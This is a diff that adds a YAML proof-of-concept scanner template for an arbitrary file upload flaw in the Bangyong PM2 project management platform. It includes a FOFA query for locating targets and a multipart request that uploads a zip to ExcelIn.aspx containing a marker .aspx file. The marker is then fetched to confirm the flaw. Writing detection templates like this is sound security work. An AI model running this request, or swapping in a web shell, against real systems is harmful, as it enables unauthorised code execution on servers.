@@ -1,0 +1,67 @@
+id: poc-yaml-pm2-excelIn-zip-upload
+info:
+  name: 邦永PM2项目管理平台系统ExcelIn.aspx存在任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: PM2项目管理平台
+  fofa: body="PM2项目管理系统BS版增强工具.zip"
+variables:
+  t1: random_int(100,999)
+  archive: new_archive("zip")
+  archive1: archive.Add("test"+t1+".aspx","vulnerability")
+  archive2: archive.Build("raw")
+requests:
+- method: POST
+  path: /FlowChartDefine/ExcelIn.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=---------------------------335518608136410266804188096265
+  data: '-----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="__VIEWSTATE"
+
+
+    CX8CDdAjNN9+19sa3xOCEybpUx0hn5DnMqGQQzm1JI+njfE/pGi9oDDI5PRCH8wVs/UCahOCnHho2chhS8X5jCYrh1hzlOaS5VIl/VYxh3LhmXkQwsOYhNFmg9+ZmmilXRKT5WAN6WceP6U9c1Kqtw==
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+
+    FD259C0F
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+
+    dvfybORq87SoxN9g6GB9Qryd4qSb5ynAZtDiE0yV2TwdNpGBHpvAVQSmjJzCuqbm/b0rSjXag7dSZXfX041XcbqxqzunkN0F88hB7kUvvb8RZ0DDlXcuuntLzH6gkJYF
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="FileUpload1"; filename="1.zip"
+
+    Content-Type: application/x-zip-compressed
+
+
+    {{.archive2}}
+
+    -----------------------------335518608136410266804188096265
+
+    Content-Disposition: form-data; name="Button1"
+
+
+    模块导入
+
+    -----------------------------335518608136410266804188096265--'
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /FlowChartDefine/test{{.t1}}.aspx
+  expression: 'status_code == 200 &&
+
+    contains(body,"vulnerability")
+
+    '
+transport: http
